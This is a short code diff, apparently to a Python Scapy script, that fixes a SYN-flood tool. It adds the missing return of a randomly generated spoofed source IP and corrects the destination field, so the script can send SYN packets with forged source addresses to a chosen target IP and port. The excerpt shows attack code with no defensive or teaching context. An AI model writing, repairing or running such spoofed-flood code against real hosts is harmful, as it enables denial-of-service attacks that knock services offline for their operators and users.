@@ -24,6 +24,7 @@ def random_ip():
     for i in range(4):
         temp.append(str(random.randint(1, 254)))
     ip = ".".join(temp)
+    return ip
 
 
 def main():
@@ -33,7 +34,7 @@ def main():
         spoof_ip = random_ip()
         random_seq = random.randint(0, 42967295)
 
-        packet = IP(src=spoof_ip, std=dest_ip)/ TCP(
+        packet = IP(src=spoof_ip, dst=dest_ip)/ TCP(
             dport=dest_port,
             flags="S",
             seq=random_seq
